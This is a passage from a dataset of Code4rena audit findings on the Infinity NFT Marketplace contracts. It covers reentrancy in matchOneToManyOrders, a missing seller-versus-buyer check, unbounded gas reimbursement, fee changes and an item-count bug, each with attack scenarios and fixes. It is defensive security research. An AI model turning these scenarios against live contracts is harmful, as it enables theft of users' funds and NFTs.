      "content": "_Submitted by unforgiven, also found by GreyArt_\n\nFunctions `matchOneToOneOrders()`, `matchOneToManyOrders()`, `matchOrders()`, `takeMultipleOneOrders()`, `takeOrders()` are for order matching and order execution and they validate different things about orders but there is no check for that `seller != buyer`, which can cause wrong order matching resulting in fund lose or fund theft or griefing. (it can be combined with other vulns to perform more damaging attacks)\n\n### Proof of Concept\n\nWe only give proof of concept for `matchOneToManyOrders()` and other order execution/matching functions has similar bugs which root cause is not checking `seller != buyer`.\nThis is `matchOneToManyOrders()` code:\n\n      /**\n       @notice Matches one  order to many orders. Example: A buy order with 5 specific NFTs with 5 sell orders with those specific NFTs.\n       @dev Can only be called by the match executor. Refunds gas cost incurred by the\n            match executor to this contract. Checks whether the given complication can execute the match.\n       @param makerOrder The one order to match\n       @param manyMakerOrders Array of multiple orders to match the one order against\n      */\n      function matchOneToManyOrders(\n        OrderTypes.MakerOrder calldata makerOrder,\n        OrderTypes.MakerOrder[] calldata manyMakerOrders\n      ) external {\n        uint256 startGas = gasleft();\n        require(msg.sender == MATCH_EXECUTOR, 'OME');\n        require(_complications.contains(makerOrder.execParams[0]), 'invalid complication');\n        require(\n          IComplication(makerOrder.execParams[0]).canExecMatchOneToMany(makerOrder, manyMakerOrders),\n          'cannot execute'\n        );\n        bytes32 makerOrderHash = _hash(makerOrder);\n        require(isOrderValid(makerOrder, makerOrderHash), 'invalid maker order');\n        uint256 ordersLength = manyMakerOrders.length;\n        // the below 3 variables are copied to memory once to save on gas\n        // an SLOAD costs minimum 100 gas where an MLOAD only costs minimum 3 gas\n        // since these values won't change during function execution, we can save on gas by copying them to memory once\n        // instead of SLOADing once for each loop iteration\n        uint16 protocolFeeBps = PROTOCOL_FEE_BPS;\n        uint32 wethTransferGasUnits = WETH_TRANSFER_GAS_UNITS;\n        address weth = WETH;\n        if (makerOrder.isSellOrder) {\n          for (uint256 i = 0; i < ordersLength; ) {\n            // 20000 for the SSTORE op that updates maker nonce status from zero to a non zero status\n            uint256 startGasPerOrder = gasleft() + ((startGas + 20000 - gasleft()) / ordersLength);\n            _matchOneMakerSellToManyMakerBuys(\n              makerOrderHash,\n              makerOrder,\n              manyMakerOrders[i],\n              startGasPerOrder,\n              protocolFeeBps,\n              wethTransferGasUnits,\n              weth\n            );\n            unchecked {\n              ++i;\n            }\n          }\n          isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;\n        } else {\n          uint256 protocolFee;\n          for (uint256 i = 0; i < ordersLength; ) {\n            protocolFee += _matchOneMakerBuyToManyMakerSells(\n              makerOrderHash,\n              manyMakerOrders[i],\n              makerOrder,\n              protocolFeeBps\n            );\n            unchecked {\n              ++i;\n            }\n          }\n          isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;\n          uint256 gasCost = (startGas - gasleft() + WETH_TRANSFER_GAS_UNITS) * tx.gasprice;\n          // if the execution currency is weth, we can send the protocol fee and gas cost in one transfer to save gas\n          // else we need to send the protocol fee separately in the execution currency\n          // since the buyer is common across many sell orders, this part can be executed outside the above for loop\n          // in contrast to the case where if the one order is a sell order, we need to do this in each for loop\n          if (makerOrder.execParams[1] == weth) {\n            IERC20(weth).safeTransferFrom(makerOrder.signer, address(this), protocolFee + gasCost);\n          } else {\n            IERC20(makerOrder.execParams[1]).safeTransferFrom(makerOrder.signer, address(this), protocolFee);\n            IERC20(weth).safeTransferFrom(makerOrder.signer, address(this), gasCost);\n          }\n        }\n      }\n\nin its executions it calls `InfinityOrderBookComplication.canExecMatchOneToMany()`, `verifyMatchOneToManyOrders()`, `isOrderValid()` to see that if orders are valid and one order matched to all other orders but there is no check for `seller != buyer` in any of those functions. and also `ERC721` and `ERC20` allows funds and assets to be transferred from address to itself.\nSo it's possible for `matchOneToManyOrders()` to match one user sell orders to its buy orders which can cause fund theft or griefing. This is the scenario for fund lose in `matchOneToManyOrders()`:\n\n1.  Let's assume orders `NFT` ids are for one collection for simplicity.\n2.  `NFT ID[1]` fair price is `8 ETH` and `NFT ID[2]` fair price is `2 ETH`.\n3.  `user1` wants to buy `NFT IDs[1,2]` at `10 ETH` (both of them) so he create one buy order and signs it.\n4.  `user1` wants to sell `NFT ID[1]` at `2.5 ETH` and sell `NFT ID[2]` at `8.5 ETH`. and he wants to sell them immediately after buying them so he create this two sell orders and sign them.\n5.  `attacker` who has `NFT ID[1]` creates an sell order for it at `7.5 ETH` and signs it.\n6.  Off-chain machining engine sends this orders to `matchOneToManyOrders()`: many orders = \\[`(attacker sell ID[1] at 7.5 ETH)` , `(user1 sell ID[1] at 2.5 ETH)`] , one order = `(user1 buy IDs[1,2] at 10ETH)`\n7.  Function `matchOneToManyOrders()` logic will check orders and their matching and all the checks would be passed for matching one order to many order(becase tokens lists intersects and numTokens are valids too (`1+1=2`))\n8.  Function `matchOneToManyOrders()` would execute order and transfer funds and tokens which would result in: (transferring `7.5 ETH` from `user 1` to `attacker`) (transferring `2.5 ETH` from `user1` to `user1`) (transferring `NFT ID[1]` from `attacker` to `user1`) (transferring `NFT ID[1]` from `user1` to `user1`)\n9.  So in the end contract executed `user1` buy order `(user1 buy IDs[1,2] at 10ETH)` but `user` only received `NFT ID[1]` and didn't received `NFT ID[2]` so contract code perform operation contradiction to what `user1` has been signed.\n\nOf course for this attack to work for `matchOneToManyOrders()` off-chain matching engine need to send wrong data but checks on the contract are not enough.\n\nThere are other scenarios for other functions that can cause griefing, for example for function `matchOrders()`:\na user can have multiple order to buy some tokens in list of ids. it's possible to match these old orders:\n\n1.  `user1` has this order: A:`(user1 BUY 1 of IDs[1,2,3])` and  B:`(user1 BUY 1 of IDs[1,4,5])`\n2.  then the order B get executed for ID\\[1] and `user1` become the owner of `ID[1]`\n3.  `user1` wants to sell some of his tokens so he signs this order: C::`(user1 SELL 1 of IDs[1,6,7])`\n4.  matching engine would send order A and C with `constructedNfts=ID[1]` to `matchOrders()`.\n5.  `matchOrders()` would check conditions and would see that conditions are met and perform the transaction.\n6.  `user1` would pay some unnecessary order fee and it would become like griefing and DOS attack for him.\n\nThere may be other scenarios for this vulnerability to be harmful for users.\n\n### Tools Used\n\nVIM\n\n### Recommended Mitigation Steps\n\nAdd some checks to ensure that `seller != buyer`\n\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/130#issuecomment-1160551805):**\n > Agree with assessment. Fixed in: https://github.com/infinitydotxyz/exchange-contracts-v2/commit/c3c0684ac02e0cf1c03cdbee7e68c5a37fa334a8\n\n**[HardlyDifficult (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/130#issuecomment-1179818269):**\n > This is an interesting scenario where a buyer looking to flip immediately could have their order under filled.\n> \n> Given the specifics of this scenario where the user needs to sign both a buy and a sell with the same NFTs, I'm inclined to rate this a Medium risk issue.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about functions in the InfinityExchange.sol contract that are used for order matching and order execution. These functions do not have a check for seller and buyer being different, which can lead to wrong order matching and potential fund loss. This vulnerability can be combined with other vulnerabilities to do more damage. \n\nA proof of concept is given for the function matchOneToManyOrders(). In this scenario, a user wants to buy two NFTs at a total cost of 10 ETH. They create one buy order and two sell orders, one for each NFT. An attacker who has one of the NFTs creates a sell order for it at 7.5 ETH. The off-chain matching engine sends these orders to the matchOneToManyOrders() function, which checks that the orders are valid and matches the one order to the many orders. The result is that the user transfers 7.5 ETH to the attacker, 2.5 ETH to themselves, and they receive the NFT from the attacker. \n\nFor the matchOrders() function, a user can have multiple orders to buy some tokens in a list of IDs. If the order is old, it is possible to match it. The user would then pay an unnecessary order fee, which could be seen as a griefing or DDoS attack. \n\nThe recommended mitigation step is to add checks to ensure that the seller and buyer are different.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/130",
      "tags": [],
      "finders": [
        "unforgiven",
        "GreyArt"
      ]
    },
    {
      "id": "2780",
      "title": "[M-03] Protocol fee rate can be arbitrarily modified by the owner and the new rate will apply to all existing orders",
      "impact": "MEDIUM",
      "content": "_Submitted by WatchPug, also found by berndartmueller, BowTiedWardens, cccz, csanuragjain, defsec, GreyArt, joestakey, m9800, peritoflores, reassor, Ruhum, shenwilly, throttle, and zer0dot_\n\n```solidity\nfunction matchOneToOneOrders(\n    OrderTypes.MakerOrder[] calldata makerOrders1,\n    OrderTypes.MakerOrder[] calldata makerOrders2\n  ) external {\n    uint256 startGas = gasleft();\n    uint256 numMakerOrders = makerOrders1.length;\n    require(msg.sender == MATCH_EXECUTOR, 'OME');\n    require(numMakerOrders == makerOrders2.length, 'mismatched lengths');\n\n    // the below 3 variables are copied to memory once to save on gas\n    // an SLOAD costs minimum 100 gas where an MLOAD only costs minimum 3 gas\n    // since these values won't change during function execution, we can save on gas by copying them to memory once\n    // instead of SLOADing once for each loop iteration\n    uint16 protocolFeeBps = PROTOCOL_FEE_BPS;\n    uint32 wethTransferGasUnits = WETH_TRANSFER_GAS_UNITS;\n```\n\nPer [the comment](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1120-L1121):\n\n> Transfer fees. Fees are always transferred from buyer to the seller and the exchange although seller is the one that actually 'pays' the fees\n\nAnd the code:\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L725-L729>\n\n```solidity\n    uint256 protocolFee = (protocolFeeBps * execPrice) / 10000;\n    uint256 remainingAmount = execPrice - protocolFee;\n    _transferMultipleNFTs(sell.signer, buy.signer, sell.nfts);\n    // transfer final amount (post-fees) to seller\n    IERC20(buy.execParams[1]).safeTransferFrom(buy.signer, sell.signer, remainingAmount);\n```\n\nIn the current design/implementation, the protocol fee is paid from the buyer's wallet, regardless of whether the buyer is the taker or the maker. And the protocol fee will be deducted from the `execPrice`, only the `remainingAmount` will be sent to the seller.\n\nThis is unconventional as if the buyer placed a limit order, say to sell 1 Punk for 100 ETH, it means that the seller is expected to receive 100 ETH. And now the seller must consider the fee rate and if they expect 100 ETH, the price must be set to 101 ETH.\n\nWhile this is unconventional and a little inconvenience, it's still acceptable IF the protocol fee rate is fixed, OR the seller is the taker so that they can do the math and agrees to the protocol fee when they choose to fulfill the counterparty's maker order.\n\nHowever, that's not always the case with the current implementation: the protocol can be changed, effective immediately, and applies to all existing orders.\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1265-L1269>\n\n```solidity\n    /// @dev updates exchange fees\n  function setProtocolFee(uint16 _protocolFeeBps) external onlyOwner {\n    PROTOCOL_FEE_BPS = _protocolFeeBps;\n    emit NewProtocolFee(_protocolFeeBps);\n  }\n```\n\nPlus, when the protocol fee rate updated to a higher rate, say from `5%` to `50%`, an maker order placed before this fee rate update can be fulfilled by a buyer, while the buyer still pays the same amount, the seller (maker) will receive `45%` less than the initial sell order amount.\n\n### Recommendation\n\n1.  Consider making the protocol fee rate a constant, ie, can not be changed;\n2.  Or, consider changing to the protocol fee always be paid by the taker; while matching the maker buy and maker sell orders, the protocol fee must be paid from the price difference between the buy price and sell price;\n3.  Or, consider changing to the new protocol fee only applies to the orders created after the rate updated.\n\n**[nneverlander (Infinity) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/259#issuecomment-1160585250):**\n > This was a design decision. Initially we were fetching the protocol fee from the complication but decided not to make external contract calls for this to save on gas. The other option was to make the protocol fee a part of the maker order but that comes with its own attack surface.  So we implemented a compromise: https://github.com/infinitydotxyz/exchange-contracts-v2/commit/793ee814d86030477470c81c4f6fda353967a42a\n> \n> As such the severity of the bug can be classified as low since this assumes malicious intent on part of the protocol admin.\n\n**[HardlyDifficult (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/259#issuecomment-1179592297):**\n> Maker sell orders are charged the fee set at the time an order is filled and not when the order was created.\n> \n> I'm not sure that I agree this concern is limited to malicious intent. With the ability to change fee, it's safe to assume at some point the admin may choose to increase the fee. At that point, all outstanding maker sells are subject to a higher fee than expected. Some users may be more sensitive to this than others. The warden's recommendations seems to address that concern and the fix the sponsor posted mitigates it by setting a max fee that may apply.\n> \n> I think this is a Medium risk issue - an unexpected bump in fee impacting users who interacted with the system previous to that change is a form of value leak.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue in the code of the InfinityExchange smart contract. The code in question is from lines 132 to 146 and from lines 1120 to 1121. The issue is that the protocol fee is paid from the buyer's wallet regardless of whether the buyer is the taker or the maker. This means that if the buyer places a limit order, say to sell 1 Punk for 100 ETH, the seller will only receive the amount after the protocol fee is deducted from the execPrice. This is unconventional, as the seller is expected to receive the full amount. Additionally, the protocol fee rate can be changed, which could be detrimental to the seller. \n\nThe report recommends three potential solutions. The first is to make the protocol fee rate a constant, so it can not be changed. The second is to make the protocol fee always be paid by the taker. This means that when matching the maker buy and maker sell orders, the protocol fee must be paid from the price difference between the buy price and sell price. The third is to make the new protocol fee only applies to the orders created after the rate updated. \n\nOverall, this bug report is about an issue in the code of the InfinityExchange smart contract, where the protocol fee is paid from the buyer's wallet regardless of whether the buyer is the taker or the maker. The report recommends three potential solutions to address the issue.",
      "quality_score": 3,
      "rarity_score": 1,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/259",
      "tags": [
        "Admin"
      ],
      "finders": [
        "csanuragjain",
        "GreyArt",
        "zer0dot",
        "reassor",
        "BowTiedWardens",
        "cccz",
        "joestakey",
        "Ruhum",
        "throttle",
        "WatchPug",
        "berndartmueller",
        "shenwilly",
        "peritoflores",
        "m9800",
        "defsec"
      ]
    },
    {
      "id": "2779",
      "title": "[M-02] Maker order buyer is forced to reimburse the gas cost at any `tx.gasprice`",
      "impact": "MEDIUM",
      "content": "_Submitted by WatchPug, also found by 0xsanson, and shenwilly_\n\n```solidity\nuint256 gasCost = (startGasPerOrder - gasleft() + wethTransferGasUnits) * tx.gasprice;\n// if the execution currency is weth, we can send the protocol fee and gas cost in one transfer to save gas\n// else we need to send the protocol fee separately in the execution currency\nif (buy.execParams[1] == weth) {\n  IERC20(weth).safeTransferFrom(buy.signer, address(this), protocolFee + gasCost);\n} else {\n  IERC20(buy.execParams[1]).safeTransferFrom(buy.signer, address(this), protocolFee);\n  IERC20(weth).safeTransferFrom(buy.signer, address(this), gasCost);\n}\n```\n\nIn the current design/implementation, while the order is executed by the `MATCH_EXECUTOR`, the gas cost will always be paid by the maker order's buyer.\n\nWhile the buyer did agreed to pay a certain price for certain NFTs, the actual cost for that maker buy order is unpredictable: because the `MATCH_EXECUTOR` can choose to execute the order while the network is extremly busy and the gas price is skyhigh.\n\nAs the gas cost at whatever gas price will be reimbursed by the buyer, the executor has no incentive to optimize and choose to execute the order at a lower gas cost.\n\nThe result is the buyer can sometimes end up paying much higher total price (incl. gas cost) for the items they bought.\n\n### Impact\n\nWhile this is more of a design issue than a wrong implementation, the impact can be very severe for some users, and can cause defacto fund loss to the users who have they maker buy orders matched at a high gas price transactions.\n\n### Recommendation\n\nConsider adding a new paramer to maker buy orders, `maxGasCost` to allow the buyer to limit the max gas they agreed to pay.\n\n**[nneverlander (Infinity) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/257#issuecomment-1160618955):**\n> We have considered this issue and decided to handle it offchain. The offchain matching engine does not send txns if gas costs are high by default. While this involves some trust, we wanted to simplify the UX for users. \n> \n> In any case, it is trivial for us to add the max gas preference setting offchain on the UI and the matching engine will respect that. \n> \n> We can consider adding this preference to the orderType itself in a future implementation.\n> \n> As such, the bug can be classified as low risk but I leave it up to more experienced judges.\n> \n\n**[HardlyDifficult (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/257#issuecomment-1179578358):**\n> Thank you for the detailed response here @nneverlander!\n> \n> Due to the gas refund logic highlighted by the warden here, users could end up spending their entire balance (or amount approved) unexpectedly. I understand that this could be handled with off chain logic but a bug in that system could have significant impact on users. Since it is just a single trusted actor that could cause damage here - I believe this is a Medium risk issue due to the \"external requirements\" such as a bug in the off chain matcher.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code for the Infinity Exchange smart contract. The code allows for the gas cost of an order to be paid by the buyer of the order, regardless of the gas price. This means that the buyer can end up paying more than they agreed to for the order due to high gas prices. This can lead to significant losses for the buyer. The recommendation is to add a parameter to the maker buy order, maxGasCost, to allow the buyer to limit the max gas they are willing to pay.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/257",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "WatchPug",
        "shenwilly",
        "0xsanson"
      ]
    },
    {
      "id": "2778",
      "title": "[M-01] InfinityExchange computes gas refunds in a way where the first order's buyer pays less than the later ones",
      "impact": "MEDIUM",
      "content": "_Submitted by Ruhum, also found by 0xf15ers, 0xsanson, antonttc, kenzo, and WatchPug_\n\n<https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L149>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L202>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L273>\n\n### Impact\n\nThe way the gas refunds are computed in the InfinityExchange contract, the first orders pay less than the latter ones. This causes a loss of funds for the buyers whose orders came last in the batch.\n\n### Proof of Concept\n\nThe issue is that the `startGasPerOrder` variable is computed within the for-loop. That causes the first iterations to be lower than later ones.\n\nHere's an example for the following line: <https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L202>\nTo make the math easy we use the following values:\n\n    startGas = 1,000,000\n    gasPerOrder = 100,000 (so fulfilling an order costs us 100,000 gas)\n    ordersLength = 10\n\nFor the 2nd order we then get:\n\n    startGasPerOrder = 900,000 + ((1,000,000 + 20,000 - 900,000) / 10)\n    startGasPerOrder = 912,000\n\nFor the 9th order we get:\n\n    startGasPerOrder = 200,000 + ((1,000,000 + 20,000 - 200,000) / 10)\n    startGasPerOrder = 282,000\n\nThe `startGasPerOrder` variable is passed through a couple of functions without any modification until it reaches a line like this: <https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L231>\n\n```sol\nuint256 gasCost = (startGasPerOrder - gasleft() + wethTransferGasUnits) * tx.gasprice;\n```\n\nThere, the actual gas costs for the user are computed.\n\nIn our case, that would be:\n\n    # 2nd order\n    # gasleft() is 800,00 because we said that executing the order costs ~100,000 gas. At the beginning of the order, it was 900,000 so now it's 800,000. This makes the computation a little more straightforward although it's not 100% correct.\n    gasCost = (912,000 - 800,000 + 50,000) * 1\n    gasCost = 162,000\n\n    # 9th order\n    gasCost = (282,000 - 100,000 + 50,000) * 1\n    gasCost = 232,000\n\nSo the 2nd order's buyer pays `162,000` while the 9th order's buyer pays `232,000`.\n\nAs I said the math was dumbed down a bit to make it easier. The actual difference might not be as big as shown here. But, there is a difference.\n\n### Recommended Mitigation Steps\n\nThe `startGasPerOrder` variable should be initialized *outside* the for-loop.\n\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/82#issuecomment-1162872661):**\n > Fixed in https://github.com/infinitydotxyz/exchange-contracts-v2/commit/5a3f81b82a9bee2de7517b3a5f18953cb5ec3684\n> \n> Agree with risk assessment.\n\n**[HardlyDifficult (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/82#issuecomment-1179582713):**\n > When multiple orders are processed in batch, some users pay more than their expected share of gas costs.\n> \n> Although the impact may be relatively small values, this appears to be a common path and would result in taking more value than expected from many users during normal usage. Rating this a Medium risk issue as it leaks value impacting users who are not first in a batch transaction.\n\n***\n\n",
      "summary": "\nThis bug report is about an issue with the InfinityExchange contract, in which the first orders pay less than the latter ones, causing a loss of funds for the buyers whose orders came last in the batch. This is due to the way the gas refunds are computed in the contract, as the `startGasPerOrder` variable is computed within the for-loop. To illustrate this, an example is given using the following values: startGas = 1,000,000, gasPerOrder = 100,000, and ordersLength = 10. For the 2nd order, the startGasPerOrder is 912,000 while for the 9th order, it is 282,000. This results in the 2nd order's buyer paying 162,000 while the 9th order's buyer pays 232,000. The recommended mitigation step for this issue is to initialize the `startGasPerOrder` variable outside the for-loop.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/82",
      "tags": [],
      "finders": [
        "0xsanson",
        "0xf15ers",
        "Ruhum",
        "WatchPug",
        "antonttc",
        "kenzo"
      ]
    },
    {
      "id": "2777",
      "title": "[H-11] Reentrancy from `matchOneToManyOrders`",
      "impact": "HIGH",
      "content": "_Submitted by kenzo, also found by 0xDjango_\n\n<https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L178>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L216>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L230>\n\n### Vulnerability Details\n\n`matchOneToManyOrders` doesn't conform to Checks-Effects-Interactions pattern, and updates the maker order nonce only after the NFTs and payment have been sent.\nUsing this, a malicious user can re-enter the contract and re-fulfill the order using `takeOrders`.\n\n### Impact\n\nOrders can be executed twice. User funds would be lost.\n\n### Proof of Concept\n\n`matchOneToManyOrders` will set the order nonce as used only after the tokens are being sent:\n\n      function matchOneToManyOrders(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.MakerOrder[] calldata manyMakerOrders) external {\n        ...\n        if (makerOrder.isSellOrder) {\n          for (uint256 i = 0; i < ordersLength; ) {\n            ...\n            _matchOneMakerSellToManyMakerBuys(...); // @audit will transfer tokens in here\n            ...\n          }\n          //@audit setting nonce to be used only here\n          isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;\n        } else {\n          for (uint256 i = 0; i < ordersLength; ) {\n            protocolFee += _matchOneMakerBuyToManyMakerSells(...); // @audit will transfer tokens in here\n            ...\n          }\n          //@audit setting nonce to be used only here\n          isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;\n          ...\n      }\n\nSo we can see that tokens are being transferred before nonce is being set to executed.\n\nTherefore, POC for an attack -\nAlice wants to buy 2 unspecified WolfNFT, and she will pay via AMP, an ERC-777 token.\nMalicious user Bob will set up an offer to sell 2 WolfNFT.\nThe MATCH_EXECUTOR will match the offers.\nBob will set up a contract such that upon receiving of AMP, it will call [`takeOrders`](https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L336) with Alice's order, and 2 other WolfNFTs.\n(Note that although `takeOrders` is `nonReentrant`, `matchOneToManyOrders` is not, and so the reentrancy will succeed.)\n\nSo in `takeOrders`, the contract will match Alice's order with Bob's NFTs, and then set Alice's order's nonce to true, then `matchOneToManyOrders` execution will resume, and again will set Alice's order's nonce to true.\n\nAlice ended up buying 4 WolfNFTs although she only signed an order for 2. Tough luck, Alice.\n\n(Note: a similar attack can be constructed via ERC721's onERC721Received.)\n\n### Recommended Mitigation Steps\n\nConform to CEI and set the nonce to true before executing external calls.\n\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/184#issuecomment-1162891402):**\n > Fixed in: https://github.com/infinitydotxyz/exchange-contracts-v2/commit/b90e746fa7af13037e7300b58df46457a026c1ac\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/184#issuecomment-1179805097):**\n > Great catch! Agree with the assessment.\n\n\n\n***\n\n \n",
      "summary": "\nThis bug report is about a vulnerability in the 'matchOneToManyOrders' function of the 'InfinityExchange' smart contract. The issue is that the function does not conform to the Check-Effects-Interactions (CEI) pattern, and updates the maker order nonce only after the Non-Fungible Tokens (NFTs) and payment have been sent. This means that a malicious user can re-enter the contract and re-fulfill the order using 'takeOrders'. This can result in a user's funds being lost as orders can be executed twice. \n\nA proof of concept (POC) is provided which outlines a scenario where Alice wants to buy 2 unspecified WolfNFTs and pays via AMP, an ERC-777 token. Malicious user Bob sets up an offer to sell 2 WolfNFTs. The MATCH_EXECUTOR matches the offers, and Bob sets up a contract which calls 'takeOrders' with Alice's order and 2 other WolfNFTs. This is possible as 'matchOneToManyOrders' is not non-reentrant. As a result, Alice ends up buying 4 WolfNFTs instead of the 2 she signed up for.\n\nThe recommended mitigation step is to conform to CEI and set the nonce to true before executing external calls.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/184",
      "tags": [
        "Reentrancy"
      ],
      "finders": [
        "0xDjango",
        "kenzo"
      ]
    },
    {
      "id": "2776",
      "title": "[H-10] Sellers may lose NFTs when orders are matched with `matchOrders()`",
      "impact": "HIGH",
      "content": "_Submitted by KIntern, also found by csanuragjain, GimelSec, kenzo, and unforgiven_\n\nFunction `matchOrders` uses custom constraints to make the matching more flexible, allow seller/buyer to specify maximum/minimum number of NFTs they want to sell/buy. This function first does some checks and then execute matching.\n\nBut in [function](https://github.com/infinitydotxyz/exchange-contracts-v2/blob/c51b7e8af6f95cc0a3b5489369cbc7cee060434b/contracts/core/InfinityOrderBookComplication.sol#L192) `areNumItemsValid()`, there is a wrong checking will lead to wrong logic in `matchOrders()` function.\n\nInstead of checking if `numConstructedItems <= sell.constraints[0]` or not, function `areNumItemsValid()` check if `buy.constraints[0] <= sell.constraints[0]`. It will lead to the scenario that `numConstructedItems > sell.constraints[0]` and make the seller sell more number of nfts than he/she allow.\n\n### Proof of Concept\n\nConsider the scenario\n\n1.  Alice create a sell order to sell maximum 2 in her 3 BAYC with ids `[1, 2, 3]`\n2.  Bob create a buy order to buy mimimum any 2 BAYC with id in list `[1, 2, 3]`\n3.  Match executor call `matchOrders()` to match Alice's order and Bob's one with parameter `constructs = [1, 2, 3]`\n4.  Function `matchOrders` will transfer all NFT in `construct` list (3 NFTs `1, 2, 3`) from seller to buyer even though seller only want to sell maximum 2 NFTs.\n\nFor more information, please check this PoC.\n<https://gist.github.com/minhquanym/a95c8652de8431c5d1d24aa4076a1878>\n\n### Tools Used\n\nHardhat, Chai\n\n### Recommended Mitigation Steps\n\nReplace check `buy.constraints[0] <= sell.constraints[0]` with `numConstructedItems <= sell.constraints[0]`\n\n**[nneverlander (Infinity) confirmed](https://github.com/code-423n4/2022-06-infinity-findings/issues/164#issuecomment-1163505913)**\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/164#issuecomment-1179746706):**\n > Seller's may specify a max number of NFTs to sell, but in the scenario outlined by the warden that requirement is not enforced - leading to the sale of more NFTs than authorized.\n> \n> Accepting this as a High risk report.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the function `matchOrders` of the InfinityOrderBookComplication.sol contract. This function allows sellers and buyers to specify the maximum and minimum number of Non-Fungible Tokens (NFTs) they want to sell/buy. However, in the function `areNumItemsValid()` there is a wrong check which leads to wrong logic in the `matchOrders()` function. Instead of checking if `numConstructedItems <= sell.constraints[0]`, the function checks if `buy.constraints[0] <= sell.constraints[0]`. This can lead to the scenario where `numConstructedItems > sell.constraints[0]` and the seller is forced to sell more NFTs than they intended. \n\nTo illustrate this vulnerability, consider the scenario where Alice creates a sell order to sell maximum 2 of her 3 BAYC with ids `[1, 2, 3]` and Bob creates a buy order to buy any 2 BAYC with ids in the list `[1, 2, 3]`. When the `matchOrders()` function is called with the parameter `constructs = [1, 2, 3]`, all 3 NFTs `1, 2, 3` will be transferred from the seller to the buyer, even though the seller only wanted to sell a maximum of 2 NFTs. \n\nTo fix this vulnerability, the check `buy.constraints[0] <= sell.constraints[0]` should be replaced with `numConstructedItems <= sell.constraints[0]`. The tools used to test this vulnerability were Hardhat and Chai.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/164",
      "tags": [],
      "finders": [
        "csanuragjain",
        "KIntern",
        "unforgiven",
        "GimelSec",
        "kenzo"
      ]
    },
    {
      "id": "2775",
      "title": "[H-09] Calling `unstake()` can cause locked funds",
      "impact": "HIGH",
